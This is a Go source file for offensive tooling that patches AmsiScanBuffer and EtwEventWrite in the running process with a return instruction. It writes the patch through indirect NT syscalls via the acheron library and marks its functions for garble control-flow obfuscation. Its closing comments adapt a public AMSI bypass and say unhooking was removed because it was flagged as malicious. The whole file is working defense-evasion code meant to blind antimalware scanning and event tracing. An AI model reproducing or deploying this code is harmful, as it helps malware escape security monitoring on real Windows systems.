package AMSI_EDR

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func PatchLocalIndirect(ach *acheron.Acheron, address uintptr, patch []byte) error {
	length := uintptr(len(patch))
	var oldProtect uint32

	// change to RWX
	_, err := ach.Syscall(
		ach.HashString("NtProtectVirtualMemory"),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&address)),
		uintptr(unsafe.Pointer(&length)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		return fmt.Errorf("[-] NtProtectVirtualMemory failed: %v", err)
	}

	// write bytes for patch
	_, err = ach.Syscall(
		ach.HashString("NtWriteVirtualMemory"),
		uintptr(windows.CurrentProcess()),
		address,
		uintptr(unsafe.Pointer(&patch[0])),
		uintptr(len(patch)),
		0,
	)
	if err != nil {
		return fmt.Errorf("[-] NtWriteVirtualMemory failed: %v", err)
	}

	// Restore old permission
	_, err = ach.Syscall(
		ach.HashString("NtProtectVirtualMemory"),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&address)),
		uintptr(unsafe.Pointer(&length)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		return fmt.Errorf("[-] NtProtectVirtualMemory restore failed: %v", err)
	}
	if !verifyPatch(address, patch) {
		return fmt.Errorf("[-] Patch verification failed at address 0x%x", address)
	}

	fmt.Printf("[+] Patch applied and verified at address 0x%x\n", address)
	return nil
}

//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func verifyPatch(address uintptr, patch []byte) bool {
	for i := 0; i < len(patch); i++ {
		actual := *(*byte)(unsafe.Pointer(address + uintptr(i)))
		if actual != patch[i] {
			fmt.Printf("[-] Byte mismatch at 0x%x: expected 0x%x, got 0x%x\n", address+uintptr(i), patch[i], actual)
			return false
		}
	}
	return true
}

//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func patchAmsiIndirect(ach *acheron.Acheron) error {
	fmt.Println("[*] Patching AmsiScanBuffer with indirect syscalls...")
	amsi, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return fmt.Errorf("[-] Failed to load amsi.dll: %v", err)
	}
	addr, err := syscall.GetProcAddress(amsi, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("[-] Failed to get AmsiScanBuffer address: %v", err)
	}
	return PatchLocalIndirect(ach, addr, []byte{0xC3})
}

//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func patchEtwIndirect(ach *acheron.Acheron) error {
	fmt.Println("[*] Patching EtwEventWrite with indirect syscalls...")
	ntdll, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("[-] Failed to load ntdll.dll: %v", err)
	}
	addr, err := syscall.GetProcAddress(ntdll, "EtwEventWrite")
	if err != nil {
		return fmt.Errorf("[-] Failed to get EtwEventWrite address: %v", err)
	}
	return PatchLocalIndirect(ach, addr, []byte{0xC3})
}

//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func ExecuteAllPatchesIndirect() error {
	ach, err := acheron.New()
	if err != nil {
		return fmt.Errorf("[-] Failed to initialize Acheron: %v", err)
	}

	if err := patchAmsiIndirect(ach); err != nil {
		return err
	}

	if err := patchEtwIndirect(ach); err != nil {
		return err
	}

	fmt.Println("[+] All patches applied using indirect syscalls")
	return nil
}

//light modification from this code https://www.scriptchildie.com/evasion/av-bypass/5.-amsi-bypass and add indirect syscalls
//I remove unhooking because it was too flaged as malicious and i think that is way better to only use archeron and simpler
